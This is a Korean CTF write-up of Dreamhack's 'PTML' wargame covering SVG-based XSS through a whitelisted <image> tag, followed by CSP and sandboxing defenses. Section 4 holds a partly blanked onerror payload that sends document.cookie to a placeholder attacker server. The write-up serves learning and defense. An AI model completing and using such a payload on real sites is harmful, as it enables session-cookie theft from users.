---
layout: single
title: "Dreamhack : PTML 워게임 풀이 및 분석(SVG XSS)"
sidebar:
    nav: "main"

tag : [dreamhack, web, 웹 해킹, exploit, xss]
categories: [wargame, 보안]
toc : true
toc_sticky: true
toc_label: "Contents"
author_profile: true
search: true
comments: true
published: true
---

<div class="notice--success">  
본 포스팅은 드림핵의 가이드라인을 준수하여 작성되었습니다. 전체 익스플로잇 스크립트나 FLAG 값은 포함하지 않으며, 취약점의 원리 분석과 방어 대책에 집중합니다.
</div>

## 1. 개요 및 문제 정의

이번에 분석할 문제는 드림핵의 **PTML** 워게임입니다. 
이 문제는 웹 애플리케이션 단에서 파일 포맷을 파싱하고 화면에 렌더링하는 과정에서 발생하는 취약점을 다룹니다.<br> 
특히, 크기를 조절해도 화질이 깨지지 않는 2차원 벡터 이미지 형식인 **SVG(Scalable Vector Graphics)** 파일의 특성과 브라우저의 실행 메커니즘을 깊게 이해해 할수록 재미있는 아주 매력적인 문제였습니다.


## 2. 주요 코드 분석 : 틈새 찾기

제공된 파일 중에서 핵심 로직을 담당하는 백엔드(`app.py`)와 프론트엔드 (`main.py`)의 소스코드를 분석하며 취약점이 발생하는 지점을 포착해 보았습니다.

### 2-1. 백엔드 로직 분석 (app.py)
{: .no_toc}

```python
@app.route('/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        return redirect(request.url)
    file = request.files['file']
    if file.filename == '': # 파일명이 공백이면 페이지 리다이렉트
        return redirect(request.url)
    if file:
        # secure_filename을 통해 시스템 구조를 망가뜨릴 수 있는 위험한 경로/특수문자 제거
        filename = secure_filename(file.filename) 
        
        # 파일명 난수화: 무작위 방식으로 32자리 문자열 고유 식별자(UUID) 생성
        unique_id = uuid.uuid4().hex 
        unique_filename = f"{unique_id}_{filename}" 
        
        # UPLOAD_FOLDER에 안전하게 파일 저장
        file_path = os.path.join(app.config['UPLOAD_FOLDER'], unique_filename) 
        file.save(file_path) 
        
        # 관리자 봇 실행 함수 호출
        read_file(unique_filename) 
        
        # 업로드된 파일 경로를 파라미터로 포함하여 index 페이지로 리다이렉트
        return redirect(url_for('index', file=f'uploads/{unique_filename}')) 
    return '', 204
```
파일명 난수화: 사용자가 올린 파일명 앞에 uuid4().hex를 이용한 32자리의 무작위 문자열이 붙습니다.<br>
따라서 임의의 고정된 주소로 직접 접근하는 것은 불가능하며, **반드시 파일 업로드 후 생성되는 고유 주소를 추적**해야 합니다.

```python
def read_file(filename): # 관리자 봇 작동 구역 (사용자가 파일을 업로드할 때마다 실행)
    driver = None
    # 쿠키 값으로 FLAG를 심어둠 (Key: flag, Value: FLAG)
    cookie = {"name": "flag", "value": FLAG} 
    cookie.update({"domain": "127.0.0.1"})
    try:
        service = Service(executable_path="/usr/local/bin/chromedriver") # 셀레늄 크롬 드라이버 실행
        options = webdriver.ChromeOptions()
        for arg in ["headless", "window-size=1920x1080", "disable-gpu", "no-sandbox", "disable-dev-shm-usage"]:
            options.add_argument(arg)
            
        driver = webdriver.Chrome(service=service, options=options)
        driver.implicitly_wait(3)
        driver.set_page_load_timeout(3)
        
        # [★ 중요] 로컬 서버(127.0.0.1) 홈에 먼저 접속하여 쿠키를 심음
        driver.get("[http://127.0.0.1:8000/](http://127.0.0.1:8000/)") 
        driver.add_cookie(cookie) 
        
        # 쿠키를 심은 뒤, 사용자가 방금 업로드한 파일 경로로 이동
        driver.get(f"[http://127.0.0.1:8000/?file=uploads/](http://127.0.0.1:8000/?file=uploads/){filename}")
        WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.TAG_NAME, "svg")))
```

 봇의 메커니즘: 브라우저 보안 정책(Same-Origin Policy)상 해당 도메인에 먼저 접속되어 있지 않으면 쿠키를 구울 수 없습니다. <br>
 따라서 **로컬 주소(127.0.0.1:8000)**에 들러 **flag 쿠키**를 심은 다음, 곧바로 공격자가 업로드한 파일 주소로 이동합니다.<br> 
 저는 봇이 공격자 파일 주소에 머무르는 이 찰나의 타이밍에 쿠키를 가로채고자 하였습니다.

### 2-2. 로직 분석 (main.py)
{: .no_toc}

```python
def load_svg_from_string(svg_string):
    parser = DOMParser.new()
    doc = parser.parseFromString(svg_string, "image/svg+xml")
    
    # 루트 태그가 <svg>인지, 네임스페이스 주소가 올바른지 검증
    if doc.documentElement.tagName != "svg" or doc.documentElement.namespaceURI not in ["[http://www.w3.org/2000/svg](http://www.w3.org/2000/svg)", "x"]:
        raise ValueError("Root element is not <svg> or has incorrect namespace")
        
    # 허용된 태그 화이트리스트 정의
    allowed_elements = [
        "svg", "path", "rect", "circle", "ellipse", "line", "polyline", "polygon",
        "text", "tspan", "textPath", "altGlyph", "altGlyphDef", "altGlyphItem",
        "glyphRef", "altGlyph", "animate", "animateColor", "animateMotion",
        "animateTransform", "mpath", "set", "desc", "title", "metadata",
        "defs", "g", "symbol", "use", "image", "switch", "style"
    ]
    
    # 모든 엘리먼트를 돌며 화이트리스트에 없는 태그가 발견되면 예외 처리
    elements = doc.getElementsByTagName("*")
    for element in elements:
        if element.tagName not in allowed_elements:
            raise ValueError(f"Disallowed SVG element found: {element.tagName}")
            
    return doc.documentElement

화이트리스트 검증: 가장 바깥 태그는 무조건 <svg> 규격을 만족해야 하며, 
내부 태그들은 allowed_elements 배열에 선언된 안전한 태그만 사용할 수 있도록 제한하고 있습니다.
흔히 XSS에 쓰이는 <script> 태그는 당연히 차단됩니다.
```

## 3.가설설정 : SVG화이트리스트의 허점 찾기!

화이트리스트를 꼼꼼히 살펴보던 중, 눈에 띄는 태그를 하나 발견했습니다. 바로 **<font color='Crimson'>image</font>** 태그가 허용 리스트에 당당히 수록되어 있다는 점입니다.<br>
드림핵 강의를 통해 **img**태그와 **<font color='Crimson'>onerror</font>** 태그를 결합해 사용해 본 적이 있기에 image태그를 활용해 스크립트를 구상하고자 했습니다.<br>

이를 기반으로 다음과 같은 익스플로잇 시나리오를 구상했습니다.

**최종 목표**: 관리자 봇의 세션 쿠키(document.cookie)에 담긴 flag 값을 가로챈다.

**조건 만족**: 필터링에 걸리지 않도록 허용된 태그 규격 안에서 악성 스크립트를 구성한다.

**스크립트 구상 방식**: image 태그의 이미지 로드가 실패할 때 발동하는 에러 이벤트를 이용하려고 했습니다.

## 4. 공격 페이로드 설계 및 개념 증명 (PoC)
드림핵 가이드라인에 따라 원클릭으로 작동하는 완전한 최종 익스플로잇 코드는 게재하지 않으며, 취약점의 메커니즘을 증명하는 단편적인 개념 스니펫 구조만 공유합니다!

### 4-1. 크로스 사이트 스크립팅(XSS) 구조 구상
{: .no_toc}
일부러 존재하지 않는 더미 이미지 파일명을 지정하여 강제로 로드 에러(Error)를 유도하고, 에러 핸들러 내부에서 리다이렉션을 통해 쿠키를 수신 서버로 쏘도록 설계하는 방식입니다.

여기서 재미있는 퀴즈를 하나 드리겠습니다. 드림핵 쿠키 세션 강의에서 기본적으로 다루는 **`location.href`**와 **`document.cookie`** 구조를 접목할 것인데, 과연 아래 빈칸에는 각각 어떤 속성과 단어가 들어가야 할까요? 

*(힌트: 일반적인 HTML의 `img` 태그와 달리, XML 기반의 SVG 명세는 이미지 주소와 에러를 인지하는 '표준 문법'이 살짝 다릅니다!)*

```python
<svg xmlns="http://www.w3.org/2000/svg">
  <image href="존재하지_않는_가짜_이미지.png"
         빈칸1="빈칸2='http://공격자-외부-수신서버/?c=' + 빈칸3" />
</svg>
```
정답을 직접 생각해보시면 좋을 것 같아서 빈칸으로 비워두었습니다!<br>
드림핵 쿠키 세션 강의에서 기본적으로 다루는 **location.href**와 **document.cookie** 구조를 접목했습니다. 
<br>일반적인 img 태그 대신 허용 목록에 포함된 image 태그를 활용했기 때문에 main.py의 화이트리스트 검증을 가볍게 통과합니다.

이후 관리자 봇이 업로드된 고유 파일 주소에 접근하여 이를 화면에 렌더링하는 순간, 존재하지 않는 이미지를 불러오다가 onerror 핸들러가 가동되면서 봇의 세션 정보를 품고 **외부 서버**로 **강제 이동**하게 됩니다.


## 5. 미스터리 분석 : 왜 성공했는데 "Invalid SVG!!"가 뜰까?
로컬 GitHub Codespaces 환경에서 실습을 진행하며 가설을 검증하던 중 기묘한 현상을 마주했습니다. <br>
공격 수신 서버(RequestBin)에는 분명 관리자 봇의 세션 쿠키와 플래그 값이 실시간으로 정상 수집되었는데, 막상 웹 브라우저 화면에는 **Invalid SVG!!**라는 **예외 처리 메시지**가 출력된 것입니다!

**성공했는데 왜 에러 분기로 빠진 걸까요?** main.py의 프로세스를 뜯어보며 추측한 원인은 다음과 같습니다.

🎮 PC방 롤-피파 중복 로그인 비유
이해하기 쉽게 비유하자면 "PC방에서 한창 리그 오브 레전드(LoL)를 즐기던 도중, 같은 자리에서 피파(FIFA) 온라인을 강제로 실행해 버린 상황"과 똑같습니다.<br>
**<font color='#4ADE80'>한자리(동일 계정/세션)에서 동시에 두 개의 게임에 접속할 수 없기 때문에</font>**, 피파가 켜지는 순간 기존에 돌아가던 **롤은 강제 종료(탈주)** 처리가 되는 것과 같습니다.

이를 브라우저의 실행 관점에서 해석하면 완벽하게 이해됩니다.

```python
# main.py의 렌더링 및 소스코드 주입 흐름
try:
    svg_element = load_svg_from_string(svg_content)  # 1차 검증 통과
    ...
except Exception as e:
    ...

original_svg_content.innerHTML = svg_content  # [★ XSS 실행 시점]
                                              # 공격자 서버로 리다이렉트 발생!!

# === [컨텍스트 파괴 및 연결 끊김] ===
svg_element = load_svg_from_string(svg_content)  # 2차 검증 시도 (하지만 이미 새로운 사이트로 리다리렉트)
svg_container.innerHTML = ""
svg_container.appendChild(svg_element)
```

즉, "**Invalid SVG!!**"라는 화면 에러는 **실패의 흔적이 아니라**, 제가 설계한 페이로드가 선제적으로 완벽히 실행되었다는 역설적인 '**<font color='#4ADE80'>공격 성공의 증거</font>**'였던 셈입니다!



## 6. 대응방안 및 심층 방어 (Defense in Depth)

이러한 **화이트리스트 기반의 우회 공격**을 막기 위해서는 단순 태그 필터링을 넘어, 인프라(보안 헤더)와 애플리케이션 설계 단에서 유기적이고 근본적인 조치가 필요합니다. 

특히 방어 정책 수립 과정에서 마주한 **가용성 침해 문제와 이를 해결하기 위한 심층 방어 과정**을 아래와 같이 정리했습니다.

### 6-1. 애플리케이션 단에서의 보안 설계
{: .no_toc}

* **DOM 기반 주입 금지 (Context Isolation):** 사용자가 업로드한 원시 SVG 스트링을 `innerHTML`을 통해 **직접 DOM에 주입**하는 행위는 매우 위험합니다. <br>
렌더링이 필요하다면 자바스크립트가 실행 상황에서 **완전히 격리된 `<iframe>` 환경의 `sandbox` 속성을 강제**하여 **내부 스크립트 실행**을 원천 **차단**해야 합니다.<br>
* **속성(Attribute) 화이트리스트 도입:** 태그 이름뿐만 아니라 `onerror`, `onload`, `onclick`과 같은 모든 이벤트 핸들러 **속성을 차단**하는 강력한 속성 검증 메커니즘을 병행해야 안전합니다.

---

### 6-2. [트러블슈팅 1차 시도] 과도한 CSP가 불러온 서비스 가용성(Crash) 오류
{: .no_toc}

애플리케이션 수정 외에 인프라 단에서 공격을 원천 봉쇄하고자 백엔드(`app.py`) 응답 헤더에 강력한 콘텐츠 보안 정책(Content Security Policy, CSP)인 `"default-src 'self'"`를 주입했습니다. 

하지만 설정을 적용하자마자 개발자 도구에 다음과 같은 치명적인 에러가 발생했습니다.

> ❌ **Console Error:**
> Loading the stylesheet 'https://pyscript.net/releases/2024.1.1/core.css' violates the following Content Security Policy directive: "default-src 'self'"...

**[원인 분석]**
본 워게임은 브라우저 상에서 파이썬 엔진을 구동하기 위해 **PyScript** 프레임워크를 기반으로 돌아가고 있었습니다.<br>

그러나 보안을 강화하겠다는 목적으로 설정한 `default-src 'self'` 정책이 PyScript 구동에 필수적인 외부 도메인 자원(`pyscript.net`)의 로딩까지 무차별적으로 차단해 버린 것입니다.


### 6-3. [최종 해결] 가용성과 기밀성을 모두 잡는 정밀 CSP 구성
{: .no_toc}

PyScript 엔진의 정상적인 생태계는 유지하되, 공격자가 파고드는 자바스크립트 실행 및 외부 유출 경로만 정밀 타격하여 차단할 수 있도록 화이트리스트 기반의 촘촘한 CSP 정책으로 최종 보완했습니다.

```python
# app.py 단에 적용한 최종 심층 방어 보안 헤더 설정
@app.after_request
def add_security_headers(response):
    response.headers['Content-Security-Policy'] = (
        "default-src 'self'; " #자원이 외부로 나가지 않게 하기 위해서
        "style-src 'self' [https://pyscript.net](https://pyscript.net); "              
         # 웹 디자인을 PyScript 공식 스타일과 내서버에서만 가져오도록 함.
        "script-src 'self' [https://pyscript.net](https://pyscript.net) 'unsafe-eval'; "
        # PyScript 실행 권한 부여 / 문자열 변환 기능 허용
        "form-action 'self'; "                                  # 외부 URL 강제 리다이렉션 제한 , 내부에서만 가능 => location.href방식 막을 수 있다!
        "object-src 'none';" #이 유형(embed와 같은 옛날 플러그인 태그) 전면 차단
    )
    return response
```

style-src와 script-src에 필수 외부 도메인을 명시하여 웹 애플리케이션의 정상 작동을 보장하면서도, **default-src 'self'**를 기반으로 **<font color='#4ADE80'>허가되지 않은 도메인</font>**으로의 데이터 반출을 **<font color='#4ADE80'>강력하게 통제</font>**합니다.

위와 같은 CSP에 대한 내용은 다음 사이트를 참고하며 작성하였습니다!
**[CSP에 관한 기본 내용 바로가기](https://developer.mozilla.org/ko/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/script-src/)**


### 6-4. 최종 방어 검증 결과
{: .no_toc}

최종 정밀 CSP 대응방안을 반영하고 로컬 도커 컨테이너를 재시작한 뒤, 동일한 익스플로잇 SVG 파일을 업로드하여 검증을 진행했습니다.
<div style="text-align: center; margin: 20px 0;">
  <img src="{{ '/images/ptml/sec.png' | relative_url }}"
       alt="방어 성공"
       style="max-width: 80%; height: auto; border: 1px solid #ddd; border-radius: 5px;">
  <p style="font-size: 0.9em; color: #ffffff;">[방어 성공!]</p>
</div>

위의 사진은 방어에 성공한 사진입니다!
공격 스크립트가 로드 에러를 틈타 외부 수신 서버(RequestBin)로 연결을 시도하는 순간, 브라우저가 **<font color='#f13e32'>"Connecting to '' violates the following Content Security Policy directive: 'default-src 'self''"</font>**라는 명확한 보안 위반 경고를 뿜으며 연결 자체를 물리적으로 끊어버렸습니다.

결과적으로 공격자 대시보드에는 단 한 줄의 패킷도 인입되지 않았으며, 인프라 단에서 **<font color='#4ADE80'>악성 데이터 유출을 완벽하게 방어</font>**하는 데 성공했습니다.

### 💡 [Behind Story] 주니어 해커의 솔직한 고백과 성장 기록
{: .no_toc}

사실 처음에는 백엔드 코드 단 몇 줄로 이 거대한 가용성 오류와 우회 공격을 한 번에 정리하는 최종 CSP(콘텐츠 보안 정책) 코드를 마주했을 때, 머릿속이 하얘졌습니다.<br> **웹 인프라 보안과 CSP 명세**는 아직 저에게 너무나도 어렵고 생소한 미지의 영역이었기 때문입니다. 

"**그냥 다 막으면(`default-src 'self'`) 끝나는 거 아닌가**?"라는 1차원적인 생각에 갇혀있던 제게, 브라우저 콘솔창에 뜬 `pyscript.net` 차단 에러 메시지는 커다란 충격이었습니다. 
<div class="notice--success">  
부끄럽게도 이 정밀 타격 방어 코드를 단번에 제 머리로 뚝딱 짜내지는 못했습니다.<br> 
에러 원인을 추적하는 과정에서 AI의 도움을 받아 정답 코드의 힌트를 얻었고, 정책 하나하나가 의미하는 바를 역으로 찾아가며 독학하는 과정을 거쳤습니다. 
</div>

아직은 저도 배우는 단계의 주니어이기에 이 인프라 보안 헤더의 모든 메커니즘을 100% 완벽하게 통제하고 이해했다고 말하기는 어렵습니다.<br> 
하지만 이번 트러블슈팅을 통해 다음과 같은 핵심 개념만큼은 확실하게 제 것으로 만들 수 있었습니다.

1. **보안과 가용성의 저울질:** 무조건 꽁꽁 싸매는 방화벽은 내 서비스(`PyScript`)까지 멈출 수 있다는 것.
2. **정밀 타격(화이트리스트)의 중요성:** 꼭 필요한 외부 도메인(`pyscript.net`)만 콕 집어 허용하는 예외 규칙 설정법.
3. **지속적인 디버깅:** 공격 성공에 취하지 않고, 방어 코드가 왜 우회되는지 콘솔 로그를 끝까지 추적하는 집념.

처음부터 완벽한 해커나 보안 엔지니어는 없다고 생각합니다.<br> 

복사 붙여넣기에서 끝내지 않고, 내가 겪은 에러 메시지의 한 줄 한 줄을 뜯어보며 '**<font color='#32aef1'>왜 안 됐을까?</font>**'를 고민했던 이 기록이 저와 같은 고민을 하는 다른 독자분들께 조금이나마 힌트가 되었으면 좋겠습니다.<br>
앞으로 더 단단하게 공부해서 완전히 제 것으로 소화해 내겠습니다!

## 7. 마치며: 보안과 가용성의 완벽한 저울질

이번 PTML 문제는 단순히 "취약점을 찾아서 익스플로잇한다"를 넘어, 보안을 구축할 때 시야를 얼마나 넓혀야 하는지 깊게 깨닫게 해 준 유익한 워게임이었습니다. 

웹 보안은 "이거 하나만 막으면 되겠지"라는 1차원적인 접근을 단호히 거부합니다.<br>
공격자가 파고드는 실행 상황의 특성을 정확히 이해하는 기밀성도 중요하지만, 보안 정책을 적용할 때 서비스의 정상적인 기능과 시스템을 해치지 않는지 가용성 관점에서도 끊임없이 조율하고 모니터링해야 진정한 방어가 완성된다는 것을 배웠습니다.

사실 이번 문제의 가설 설정 시나리오는 드림핵의 **Are you admin** 문제와 유사하여 비교적 직관적으로 설계할 수 있었습니다.<br>

하지만 파이썬 프론트엔드 엔진의 독특한 예외 처리 흐름(Invalid SVG!!)과 문법 규격 차이 때문에 공격이 실패한 줄 알고 밤새 헤맸던 디버깅 과정이 있었습니다. <br>

역설적이게도 그 삽질의 시간 덕분에 브라우저 콘솔 로그 한 줄 한 줄을 뜯어보는 집념을 기를 수 있었고, 결과적으로 백엔드 인프라 보안까지 깊이 있게 들여다보는 최고의 성장 발판이 되었습니다.

완벽한 정답을 한 번에 맞히는 것보다, 실패의 원인을 끝까지 추적해 내는 과정이 왜 해커와 보안 엔지니어에게 가장 중요한 소양인지 온몸으로 체감한 완벽한 실습이었습니다.<br>

앞으로도 마주할 수많은 에러 메시지들을 두려워하지 않고, 더 단단하게 성장하는 기록을 남겨보겠습니다. 긴 글 읽어주셔서 감사합니다!
